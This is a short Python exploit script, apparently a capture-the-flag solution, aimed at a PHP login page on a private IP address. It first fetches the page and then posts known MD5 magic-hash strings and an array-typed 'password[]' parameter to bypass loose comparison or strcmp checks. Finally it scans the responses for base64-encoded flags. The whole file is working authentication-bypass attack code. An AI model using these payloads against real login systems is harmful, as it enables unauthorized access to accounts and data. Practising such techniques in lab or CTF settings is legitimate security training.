import requests
import base64
import re

TARGET_URL = "http://10.0.162.112:80/index.php"

def b64_decode(s):
    try:
        missing_padding = len(s) % 4
        if missing_padding:
            s += '=' * (4 - missing_padding)
        return base64.b64decode(s).decode('utf-8', errors='ignore')
    except Exception:
        return None

def main():
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    print("[*] GET request to", TARGET_URL)
    try:
        r = requests.get(TARGET_URL, headers=headers)
        print("Status Code:", r.status_code)
        print("Full HTML Source:")
        print(r.text)
    except Exception as e:
        print("Error:", e)

    payloads = [
        {"password": "QNKCDZO"},
        {"password": "240610708"},
        {"password": "s878926199a"},
        {"password[]": "1"}
    ]

    for p in payloads:
        print("\n" + "="*60)
        print(f"[*] POST with payload: {p}")
        try:
            r = requests.post(TARGET_URL, data=p, headers=headers)
            print("Status Code:", r.status_code)
            print("Full Response Body:")
            print(r.text)
            
            b64_matches = re.findall(r'[A-Za-z0-9+/]{8,}={0,2}', r.text)
            for match in b64_matches:
                decoded = b64_decode(match)
                if decoded and ('flag' in decoded.lower() or '{' in decoded):
                    print(f"\n[+] Decoded Base64 ({match}): {decoded}")
                    
        except Exception as e:
            print("Error:", e)

if __name__ == "__main__":
    main()